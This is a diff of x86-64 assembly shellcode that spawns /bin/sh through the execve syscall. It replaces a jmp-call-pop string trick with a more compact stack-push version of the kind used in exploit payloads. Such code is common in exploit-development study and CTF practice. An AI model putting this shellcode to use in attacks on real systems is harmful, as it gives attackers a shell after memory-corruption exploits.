@@ -3,20 +3,18 @@ section .text
 global _start
 
 _start:
-	jmp binsh
 
-	exec:
-	
 	; execve("/bin/sh", NULL, NULL)
-	
-	xor rax, rax
-	mov rsi, rax
-	mov rdx, rax
-	mov al, 0x3b
-	pop rdi
 
+	xor rsi, rsi
+	push rsi
+	pop rdx
+
+	push rsi
+	mov rdi, 0x68732f2f6e69622f ; /bin//sh
+	push rdi
+	mov rdi, rsp
+
+	push 0x3b
+	pop rax ; SYS_execve
 	syscall
-
-	binsh:
-		call exec
-		db "/bin/sh"
